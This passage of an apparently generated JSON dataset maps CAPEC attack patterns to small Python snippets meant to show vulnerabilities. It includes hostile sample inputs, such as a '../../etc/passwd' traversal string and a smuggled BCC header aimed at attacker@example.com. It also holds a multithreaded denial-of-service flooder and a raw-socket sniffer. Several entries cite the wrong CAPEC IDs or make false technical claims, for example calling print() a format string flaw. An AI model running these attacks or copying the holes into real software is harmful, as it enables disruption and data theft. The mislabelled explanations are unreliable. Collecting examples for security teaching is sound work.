        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file_name = tmp_file.name\n\n# Simulate user input for file path\nuser_input_path = '/tmp/symlink'\n\n# Create a symbolic link pointing to the temporary file\nos.symlink(tmp_file_name, user_input_path)\n\n# Vulnerable code: Open the file based on user input without checking if it's a symlink\nwith open(user_input_path, 'r') as f:\n    data = f.read()\n\nprint(data)\n\n# Clean up\nos.remove(user_input_path)\nos.remove(tmp_file_name)",
        "description": "This Python code snippet demonstrates a symlink attack vulnerability. It creates a temporary file and a symbolic link pointing to it. The user input is simulated to provide the path of the symbolic link. The code then opens the file based on the user input without checking if it's a symlink, which can lead to accessing unintended files. This embodies the main idea of the CAPEC 'Symlink Attack' and relates to CWEs such as 'Improper Link Resolution Before File Access' and 'UNIX Symbolic Link (Symlink) Following'."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "import argparse\n\n# Hidden functionality not documented\ndef hidden_debug_mode():\n    print(\"Debugging information: Sensitive data exposed!\")\n\n# Main application functionality\ndef main():\n    parser = argparse.ArgumentParser(description='Sample Application')\n    parser.add_argument('--debug', action='store_true', help='Enable debug mode')\n    args = parser.parse_args()\n\n    if args.debug:\n        hidden_debug_mode()\n    else:\n        print(\"Normal operation\")\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simple command-line application that includes a hidden debug mode. The hidden_debug_mode function, which is not documented or intended for regular users, prints sensitive debugging information. The main function uses argparse to parse command-line arguments and checks if the --debug switch is provided. If the --debug switch is used, the hidden_debug_mode function is invoked, exposing sensitive information. This code embodies the CAPEC 'Try All Common Switches' by showing how an attacker might discover and exploit undocumented functionality (--debug switch) to reveal sensitive information. The related CWEs are represented by the hidden functionality (CWE-912), the incomplete list of disallowed inputs (CWE-184), and the unchecked error condition (CWE-391) in the context of the debug mode."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send email\ndef send_email(to_address, subject, body):\n    from_address = 'sender@example.com'\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    # SMTP server configuration\n    smtp_server = 'smtp.example.com'\n    smtp_port = 587\n\n    # Send the email\n    with smtplib.SMTP(smtp_server, smtp_port) as server:\n        server.starttls()\n        server.login('username', 'password')\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nuser_input = \"victim@example.com\\nBCC: attacker@example.com\"\nsend_email(user_input, 'Test Subject', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that is susceptible to email injection attacks. The function `send_email` takes user input for the recipient's email address (`to_address`), subject, and body of the email. The user input is directly used to construct the email headers without proper neutralization or validation. This allows an attacker to inject additional email headers by including newline characters (CRLF sequences) in the `to_address` input, potentially adding a BCC header to send the email to unintended recipients. This vulnerability is related to several CWEs, including improper neutralization of escape sequences, input terminators, and CRLF sequences."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    print(user_input)\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a string: \")\n    vulnerable_function(user_input)\n",
        "description": "This Python code snippet demonstrates a format string injection vulnerability. The `vulnerable_function` takes `user_input` as an argument and directly passes it to the `print` function without any validation or sanitization. This embodies the main idea of CAPEC-121: Format String Injection, where an adversary can include formatting characters in the input string. The related CWEs are represented as follows:\n- CWE-134: The format string is externally controlled and directly used in the `print` function.\n- CWE-20, CWE-1286: There is no input validation to ensure the input is safe and well-formed.\n- CWE-74: Special elements in the input are not neutralized, which could lead to unexpected behavior.\n- CWE-914: The function does not restrict reading from or writing to dynamically-identified variables, which could be exploited by an attacker."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\n# Establish a connection to the LDAP server\nconn = ldap.initialize('ldap://localhost')\n\n# User input (potentially malicious)\nusername = input('Enter your username: ')\n\n# Constructing the LDAP query without proper input validation\nldap_query = f\"(uid={username})\"\n\ntry:\n    # Perform the search operation\n    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_query)\n    print('Search results:', result)\nexcept ldap.LDAPError as e:\n    print('LDAP error:', e)",
        "description": "This Python code snippet demonstrates a basic LDAP query that is vulnerable to LDAP Injection. The code takes user input for a username and constructs an LDAP query without proper input validation or neutralization of special characters. An attacker could exploit this by entering special characters or additional LDAP commands to manipulate the query, potentially gaining unauthorized access to sensitive information. This example highlights the importance of validating and sanitizing user inputs to prevent injection attacks, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to parameter injection\n    url = f'http://example.com/search?query={query}'\n    # Simulate a request to the constructed URL\n    response = simulate_request(url)\n    return response\n\ndef simulate_request(url):\n    # This function simulates making a request to the constructed URL\n    return f'Simulated request to: {url}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to parameter injection. The application has a single route '/search' that accepts a GET request with a 'query' parameter. The value of this parameter is directly inserted into a URL string without any validation or encoding, making it susceptible to parameter injection attacks. For example, an attacker could manipulate the 'query' parameter to include additional parameters or special characters, potentially altering the behavior of the request. This example embodies the main idea of CAPEC-137 (Parameter Injection) and highlights related weaknesses such as CWE-88 (Improper Neutralization of Argument Delimiters in a Command) and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import importlib\n\n# Simulate external input\nuser_input = 'os'\n\n# Unsafe reflection based on user input\ntry:\n    module = importlib.import_module(user_input)\n    print(f'Module {user_input} loaded successfully.')\n    # Potentially dangerous method invocation\n    method = getattr(module, 'system')\n    method('echo Hello World')\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a reflection injection vulnerability. The code uses the `importlib` library to dynamically import a module based on user input. If the user input is 'os', the code will import the 'os' module and then use reflection to invoke the 'system' method, which can execute arbitrary shell commands. This represents the main idea of the CAPEC, where an adversary can control the input to reflection methods, leading to potential security risks such as command injection (CWE-77) and code injection (CWE-94). The code does not validate or sanitize the user input, making it vulnerable to exploitation."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/html'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a relative path traversal vulnerability. The `read_file` function takes a `file_path` as input and constructs a full path by joining it with a base directory (`/var/www/html`). The function then attempts to open and read the file at the constructed path. However, the code does not properly validate or sanitize the `file_path` input, allowing an attacker to use sequences like `../../` to traverse directories and access files outside the intended directory. For example, if `user_input` is set to `../../etc/passwd`, the function will attempt to read the system's password file, which is a common target in path traversal attacks. This snippet embodies the main idea of CAPEC-126 (Relative Path Traversal) and highlights the related CWEs by showing how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "from flask import Flask, request, redirect, url_for, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/form1', methods=['GET', 'POST'])\ndef form1():\n    if request.method == 'POST':\n        session['form1_data'] = request.form['data']\n        return redirect(url_for('form2'))\n    return '''<form method=\"post\">\n                <input type=\"text\" name=\"data\">\n                <input type=\"submit\">\n              </form>'''\n\n@app.route('/form2', methods=['GET', 'POST'])\ndef form2():\n    if 'form1_data' not in session:\n        return redirect(url_for('form1'))\n    if request.method == 'POST':\n        session['form2_data'] = request.form['data']\n        return redirect(url_for('form3'))\n    return '''<form method=\"post\">\n                <input type=\"text\" name=\"data\">\n                <input type=\"submit\">\n              </form>'''\n\n@app.route('/form3', methods=['GET', 'POST'])\ndef form3():\n    if 'form2_data' not in session:\n        return redirect(url_for('form2'))\n    if request.method == 'POST':\n        session['form3_data'] = request.form['data']\n        return 'Form submission complete'\n    return '''<form method=\"post\">\n                <input type=\"text\" name=\"data\">\n                <input type=\"submit\">\n              </form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a multi-step form submission process. The forms are designed to be filled out in sequence (form1 -> form2 -> form3). Each form saves its data in the session and redirects to the next form. However, the code is vulnerable to the 'Bypassing of Intermediate Forms in Multiple-Form Sets' attack (CAPEC-111). An attacker can directly navigate to '/form2' or '/form3' without completing the previous forms, leading to incomplete data collection and potential security issues. The code also demonstrates related CWEs: CWE-372 (Incomplete Internal State Distinction) by not properly verifying the state of the session, CWE-472 (External Control of Assumed-Immutable Web Parameter) by relying on session data that can be manipulated, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) by making security decisions based on untrusted session data."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\n\n# Function to fetch data from a URL and cache it\ncache = {}\ntrusted_sources = ['https://trusted.com/data']\n\n\ndef fetch_data(url):\n    if url in cache:\n        return cache[url]\n    response = requests.get(url)\n    if url in trusted_sources:\n        cache[url] = response.text\n    return response.text\n\n# Fetch data from a less trusted source\nurl = 'https://untrusted.com/data'\ndata = fetch_data(url)\nprint(data)\n\n# Fetch data from a trusted source\nurl = 'https://trusted.com/data'\ndata = fetch_data(url)\nprint(data)\n\n# Cache poisoning attempt\ncache['https://trusted.com/data'] = '<malicious data>'\n\n# Fetch data from the trusted source again\n# This will return the poisoned cache data\nurl = 'https://trusted.com/data'\ndata = fetch_data(url)\nprint(data)",
        "description": "This Python code snippet demonstrates a simple cache mechanism that can be exploited for cache poisoning. The `fetch_data` function fetches data from a given URL and caches it if the URL is from a trusted source. However, the cache can be poisoned by directly modifying the cache dictionary, which simulates an attack where an attacker places incorrect or harmful material in the cache. The code highlights several CWE weaknesses: it uses a less trusted source (CWE-348), does not sufficiently verify the authenticity of data (CWE-345), and accepts untrusted data with trusted data (CWE-349). The final part of the code shows how the poisoned cache can be used to return malicious data, representing the main idea of the CAPEC for cache poisoning."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import socket\n\ndef get_ip_from_hostname(hostname):\n    try:\n        # Perform DNS resolution\n        ip_address = socket.gethostbyname(hostname)\n        return ip_address\n    except socket.gaierror:\n        return None\n\ndef is_trusted_ip(ip_address):\n    # Simulate a check against a list of trusted IPs\n    trusted_ips = ['192.168.1.1', '192.168.1.2']\n    return ip_address in trusted_ips\n\ndef main():\n    hostname = 'www.example.com'\n    ip_address = get_ip_from_hostname(hostname)\n    if ip_address:\n        if is_trusted_ip(ip_address):\n            print(f'Trusted IP: {ip_address}')\n        else:\n            print(f'Untrusted IP: {ip_address}')\n    else:\n        print('Failed to resolve hostname')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simplified scenario of DNS resolution and validation, which can be vulnerable to DNS cache poisoning. The `get_ip_from_hostname` function resolves a hostname to an IP address using the `socket.gethostbyname` method. The `is_trusted_ip` function checks if the resolved IP address is in a list of trusted IPs. The `main` function ties these together, resolving a hostname and checking if the resulting IP is trusted. This code is vulnerable because it does not verify the authenticity of the DNS response, making it susceptible to DNS cache poisoning attacks. An attacker could manipulate the DNS cache to return a malicious IP address, which would not be detected by this code."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import os\nfrom flask import Flask, send_from_directory, request, abort\n\napp = Flask(__name__)\n\n# CWE-219: Sensitive data stored under web root\nSENSITIVE_DIR = os.path.join(app.root_path, 'sensitive_data')\n\n@app.route('/<path:filename>', methods=['GET'])\ndef serve_file(filename):\n    # CWE-425: Direct Request ('Forced Browsing')\n    if not request.args.get('auth_token'):\n        abort(403)  # Unauthorized access\n    try:\n        # CWE-527: Exposure of Version-Control Repository\n        if filename.startswith('.git'):\n            abort(403)  # Block access to version control directories\n        # CWE-612: Improper Authorization of Index Containing Sensitive Information\n        if filename == 'index.html':\n            abort(403)  # Block access to sensitive index file\n        return send_from_directory(SENSITIVE_DIR, filename)\n    except FileNotFoundError:\n        abort(404)  # File not found\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web server that serves files from a sensitive directory. The code demonstrates several security weaknesses: \n1. CWE-219: Sensitive data is stored under the web root directory ('sensitive_data').\n2. CWE-425: The code does not adequately enforce authorization, allowing direct requests to files if an 'auth_token' is not provided.\n3. CWE-527: The code attempts to block access to version control directories (e.g., '.git'), but this is done in a simplistic manner.\n4. CWE-612: The code blocks access to an 'index.html' file, which could contain sensitive information.\n\nThe main idea of the CAPEC is represented by the potential for an adversary to detect and access unpublicized web pages or sensitive files due to improper authorization and exposure of sensitive directories."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import requests\n\n# URL of the target web service\nurl = 'http://example.com/unpublished_service'\n\n# Attempt to access the unpublished web service\nresponse = requests.get(url)\n\nif response.status_code == 200:\n    print('Unpublished service is accessible!')\n    print('Response:', response.text)\nelse:\n    print('Service is not accessible or does not exist.')",
        "description": "This Python code snippet demonstrates an attempt to detect and access an unpublished web service on a target website. The code sends a GET request to a URL that is presumed to be an unpublished service. If the service is accessible (HTTP status code 200), it prints the response, indicating that the service is reachable and potentially lacks adequate security controls. This embodies the main idea of CAPEC-160: 'Detect Unpublicized Web Services'. The code also indirectly touches on CWE-425 ('Direct Request') by attempting to access a potentially restricted URL directly. The simplicity of the code highlights the risk of having unpublished services that are not properly secured."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import hashlib\n\n# Simulate sending a message with a checksum\nmessage = \"Important data\"\nchecksum = hashlib.md5(message.encode()).hexdigest()\n\n# Simulate an adversary modifying the message and spoofing the checksum\nmodified_message = \"Tampered data\"\nspoofed_checksum = hashlib.md5(modified_message.encode()).hexdigest()\n\n# Simulate the recipient verifying the message integrity\nreceived_message = modified_message\nreceived_checksum = spoofed_checksum\n\n# Check if the received message's checksum matches the received checksum\nif hashlib.md5(received_message.encode()).hexdigest() == received_checksum:\n    print(\"Message integrity verified.\")\nelse:\n    print(\"Message integrity compromised.\")",
        "description": "This Python code snippet demonstrates a basic example of checksum spoofing. Initially, a message is sent with its MD5 checksum. An adversary then modifies the message and generates a new checksum for the tampered message. The recipient, upon receiving the modified message and the spoofed checksum, verifies the integrity by comparing the checksum of the received message with the received checksum. Since the checksums match, the recipient incorrectly assumes the message integrity is intact. This example highlights the vulnerability described in CAPEC-37 (Checksum Spoofing) and related CWEs, such as CWE-354 (Improper Validation of Integrity Check Value) and CWE-328 (Use of Weak Hash)."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that processes XML data\n\ndef process_xml(xml_data, schema_data):\n    try:\n        # Parse the XML schema\n        schema_root = ET.fromstring(schema_data)\n        schema = ET.ElementTree(schema_root)\n\n        # Parse the XML data\n        xml_root = ET.fromstring(xml_data)\n        xml_tree = ET.ElementTree(xml_root)\n\n        # Validate XML against the schema (missing validation step)\n        # This is where the validation should occur, but it is missing\n        # xml_tree.validate(schema)\n\n        # Process the XML data\n        for elem in xml_tree.iter():\n            print(elem.tag, elem.text)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Example usage\nxml_data = '''<data><item>Example</item></data>'''\nschema_data = '''<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n<xs:element name=\"data\">\n<xs:complexType>\n<xs:sequence>\n<xs:element name=\"item\" type=\"xs:string\"/>\n</xs:sequence>\n</xs:complexType>\n</xs:element>\n</xs:schema>'''\n\nprocess_xml(xml_data, schema_data)",
        "description": "This Python code snippet demonstrates a vulnerable function `process_xml` that processes XML data based on a provided XML schema. The function parses both the XML data and the schema but fails to validate the XML data against the schema, which is a critical step to ensure the integrity and security of the XML processing. This missing validation step (CWE-112) allows an attacker to manipulate the XML schema (CAPEC-170) and potentially inject malicious content (CWE-91, CWE-643). The code also highlights the risk of external control over system settings or configuration elements (CWE-15, CWE-472) by accepting schema data from an untrusted source."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import requests\nimport threading\n\n# Function to send a SOAP request\ndef send_soap_request(url, xml_payload):\n    headers = {'Content-Type': 'text/xml'}\n    response = requests.post(url, data=xml_payload, headers=headers)\n    return response.status_code\n\n# XML payload (unvalidated and potentially harmful)\nxml_payload = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://www.example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Ping/>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Target URL\nurl = 'http://target.example.com/soap'\n\n# Function to perform the attack\ndef perform_attack():\n    while True:\n        send_soap_request(url, xml_payload)\n\n# Launch multiple threads to simulate rapid, repetitive SOAP transactions\nthreads = []\nfor i in range(100):\n    thread = threading.Thread(target=perform_attack)\n    thread.start()\n    threads.append(thread)\n\n# Join threads to ensure they run indefinitely\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a denial-of-service (DoS) attack using the 'XML Ping of the Death' technique. The code sends a large number of small SOAP messages to a target URL at a rapid rate, causing resource depletion on the target server. The XML payload is not validated, which aligns with CWE-112 (Missing XML Validation). The attack is performed using multiple threads to increase the rate of requests, exploiting CWE-400 (Uncontrolled Resource Consumption) and CWE-770 (Allocation of Resources Without Limits or Throttling). The SOAP messages are sent in cleartext, which could be intercepted, relating to CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/fetch', methods=['GET'])\ndef fetch_content():\n    url = request.args.get('url')\n    if not url:\n        return 'URL parameter is missing', 400\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return render_template_string(response.text)\n        else:\n            return 'Failed to fetch content', 500\n    except requests.RequestException as e:\n        return f'Error fetching content: {str(e)}', 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that fetches and displays content from a URL provided as a query parameter. The main idea of the CAPEC (Content Spoofing) is embodied here by the potential for an adversary to manipulate the content fetched from the specified URL. The code does not verify the authenticity of the fetched data (CWE-345), nor does it ensure the integrity of the message during transmission (CWE-924). Additionally, the use of `render_template_string` to directly render the fetched content can lead to security issues if the content includes malicious scripts (CWE-433). This example highlights how insufficient verification and improper handling of external content can lead to content spoofing vulnerabilities."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import os\ntmp_dir = '/tmp/'\ntmp_file = 'app_temp_file.txt'\n\n# Create a temporary file with predictable name\nwith open(os.path.join(tmp_dir, tmp_file), 'w') as f:\n    f.write('Temporary data')\n\n# Insecure permissions: world-writable directory\nos.chmod(tmp_dir, 0o777)\n\n# Insecure permissions: world-writable file\nos.chmod(os.path.join(tmp_dir, tmp_file), 0o666)\n\nprint(f'Temporary file created at {os.path.join(tmp_dir, tmp_file)}')",
        "description": "This Python code snippet demonstrates the creation of a temporary file with a predictable name in a world-writable directory, embodying the main idea of CAPEC-61: 'Explore for Predictable Temporary File Names'. The code creates a temporary file named 'app_temp_file.txt' in the '/tmp/' directory. It sets insecure permissions on both the directory and the file, making them world-writable. This setup is vulnerable to several attacks, such as symlink attacks, where an attacker could replace the temporary file with a symlink to another file, or information gathering, where an attacker could read or modify the contents of the temporary file. The code highlights CWE-377, CWE-378, and CWE-379 by demonstrating insecure temporary file creation and permissions, and CWE-73 by using a predictable file name."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import os\n\n# Example of a sensitive configuration file path\nconfig_file_path = '/etc/myapp/config.txt'\n\n# Function to read the configuration file\n# This function does not check for proper permissions\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-1330: Remanent Data Readable after Memory Erase\n\ndef read_config_file(path):\n    try:\n        with open(path, 'r') as file:\n            data = file.read()\n            print('Configuration Data:', data)\n    except FileNotFoundError:\n        print('Configuration file not found.')\n    except PermissionError:\n        print('Permission denied while accessing the configuration file.')\n\n# Function to clear sensitive data from the configuration file\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n\ndef clear_config_file(path):\n    try:\n        with open(path, 'w') as file:\n            file.write('')\n            print('Configuration file cleared.')\n    except FileNotFoundError:\n        print('Configuration file not found.')\n    except PermissionError:\n        print('Permission denied while accessing the configuration file.')\n\n# Read the configuration file\nread_config_file(config_file_path)\n\n# Clear the configuration file\nclear_config_file(config_file_path)\n",
        "description": "This Python code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' by accessing a sensitive configuration file located in a well-known directory (/etc/myapp/config.txt). The 'read_config_file' function reads the content of the configuration file without checking for proper permissions, which can lead to unauthorized access (CWE-552). The 'clear_config_file' function attempts to clear the content of the configuration file, but it does not ensure that the data is properly scrubbed, potentially leaving remanent data (CWE-1330). This code highlights the risks associated with storing sensitive information in predictable locations and the importance of proper data management and access control."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Simulated login attempt\nusername = 'user1'\npassword = 'password'\n\nif authenticate(username, password):\n    print('Authentication successful!')\nelse:\n    print('Authentication failed!')",
        "description": "This Python code snippet demonstrates a vulnerable authentication mechanism that embodies the concept of Identity Spoofing (CAPEC-151). The code uses MD5 hashing for password storage and verification, which is considered weak (CWE-327). The `authenticate` function checks if the provided username exists in the user database and if the hashed password matches the stored hash. However, this implementation is vulnerable to several issues: \n1. Weak Authentication (CWE-1390): MD5 is not secure for password hashing.\n2. Improper Authentication (CWE-287): The system does not sufficiently prove the identity of the user.\n3. Authentication Bypass by Spoofing (CWE-290): An attacker could potentially exploit weaknesses in the hashing mechanism to spoof the identity of a legitimate user.\nThis code highlights the importance of using strong, modern authentication mechanisms and proper verification of user identities to prevent identity spoofing attacks."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import re\n\ndef process_user_input(user_input):\n    # Improper validation of input\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        raise ValueError('Invalid input')\n    \n    # Reliance on untrusted input in a security decision\n    if user_input == 'admin':\n        print('Access granted to admin panel')\n    else:\n        print('Access denied')\n\n# Example usage\ntry:\n    user_input = input('Enter your username: ')\n    process_user_input(user_input)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to improper input validation and reliance on untrusted inputs in security decisions. The `process_user_input` function attempts to validate the input using a regular expression to allow only alphanumeric characters. However, it does not properly handle all edge cases and relies on the input value to make a security decision (granting access to the admin panel). An attacker could exploit this by providing unexpected input that bypasses the validation or manipulates the security decision logic."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Simulated user input for resource location\nuser_input_url = 'http://trusted-site.com/resource'\n\n# Adversary manipulates the URL (Resource Location Spoofing)\nspoofed_url = user_input_url.replace('trusted-site.com', 'malicious-site.com')\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\nprint(f'Requesting resource from: {user_input_url}')\n\n# CWE-290: Authentication Bypass by Spoofing\nresponse = requests.get(spoofed_url)\n\n# Display the response from the spoofed URL\nprint(f'Response from spoofed URL: {response.text}')",
        "description": "This Python code snippet demonstrates a Resource Location Spoofing attack. The user intends to request a resource from a trusted site, but an adversary manipulates the URL to point to a malicious site instead. The code does not properly verify the destination URL (CWE-941, CWE-923) or the source of the communication (CWE-940). The user interface misrepresents the critical information by displaying the original URL while actually requesting from the spoofed URL (CWE-451). The response from the malicious site is then displayed, potentially bypassing authentication mechanisms (CWE-290)."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import tempfile\nimport os\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: User Passwords')\n    temp_file_path = temp_file.name\n\n# Simulate insecure permissions by setting the file to be world-readable\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n\n# Simulate an adversary reading the temporary file\nwith open(temp_file_path, 'r') as file:\n    content = file.read()\n    print(f'Adversary reads: {content}')\n\n# Clean up the temporary file\nos.remove(temp_file_path)",
        "description": "This Python code snippet demonstrates the creation and insecure handling of a temporary file containing sensitive information. The code creates a temporary file using the `tempfile` module and writes sensitive data (e.g., user passwords) to it. The file permissions are then set to be world-readable (0o644), simulating insecure permissions. An adversary can read the contents of this temporary file, demonstrating the vulnerability. Finally, the temporary file is removed. This example embodies the CAPEC idea of exploiting insecure temporary file storage and highlights related CWEs such as insecure temporary file creation, insecure permissions, and the use of caches containing sensitive information."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import socket\n\n# This function sends sensitive data over a network without encryption\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\ndef send_sensitive_data(data, server_ip, server_port):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((server_ip, server_port))\n        s.sendall(data.encode('utf-8'))\n        response = s.recv(1024)\n    return response.decode('utf-8')\n\n# Example usage\nsensitive_data = 'username=admin&password=secret'\nserver_ip = '192.168.1.1'\nserver_port = 8080\nresponse = send_sensitive_data(sensitive_data, server_ip, server_port)\nprint('Server response:', response)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of sending sensitive data over a network. The function `send_sensitive_data` transmits sensitive information (e.g., username and password) in cleartext without any encryption, making it susceptible to sniffing attacks (CAPEC-158). This embodies CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data). An attacker who can observe the network traffic can easily intercept and read the sensitive data being transmitted."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import socket\n\n# Create a raw socket to sniff network traffic\nsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to the public network interface\nsniffer.bind(('0.0.0.0', 0))\n\n# Include IP headers in the capture\nsniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\nprint('Sniffing network traffic...')\n\ntry:\n    while True:\n        # Receive a packet\n        packet, addr = sniffer.recvfrom(65565)\n        # Print the raw packet data\n        print(packet)\nexcept KeyboardInterrupt:\n    print('Stopping the sniffer')\n    sniffer.close()",
        "description": "This Python code snippet demonstrates a basic network sniffer using raw sockets. The sniffer captures TCP/IP packets on a public network interface and prints the raw packet data. This embodies the main idea of the CAPEC 'Sniffing Network Traffic' by passively monitoring network traffic to capture sensitive information. The code does not encrypt the captured data (CWE-311), transmits sensitive information in cleartext (CWE-319), and could potentially expose sensitive system information (CWE-497). The sniffer operates passively, observing and analyzing traffic without being an intended recipient, aligning with the CAPEC description."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n\n# Simulate user input for library path\nuser_supplied_path = input('Enter the path to the library: ')\n\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\n# Attempt to load a library from the user-supplied path\ntry:\n    # This could be a malicious library if the path is controlled by an attacker\n    lib = ctypes.CDLL(os.path.join(user_supplied_path, 'malicious_lib.so'))\n    print('Library loaded successfully')\n    # Call a function from the loaded library\n    lib.malicious_function()\nexcept Exception as e:\n    print(f'Failed to load library: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where an application loads an external library based on a user-supplied path. The code uses the `ctypes` library to load a shared library (`malicious_lib.so`) from a path provided by the user. This embodies the CAPEC 'Redirect Access to Libraries' by allowing an attacker to supply a path to a malicious library, which the application then loads and executes. The related CWEs are represented as follows: CWE-426 and CWE-427 highlight the dangers of using untrusted and uncontrolled search paths, CWE-73 shows the risk of external control over file paths, CWE-706 involves the incorrect resolution of names or references, and CWE-1265 touches on the potential for unintended reentrant invocation of non-reentrant code. This code snippet is vulnerable because it does not validate or sanitize the user-supplied path, allowing an attacker to redirect the application's library loading mechanism to execute arbitrary code."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
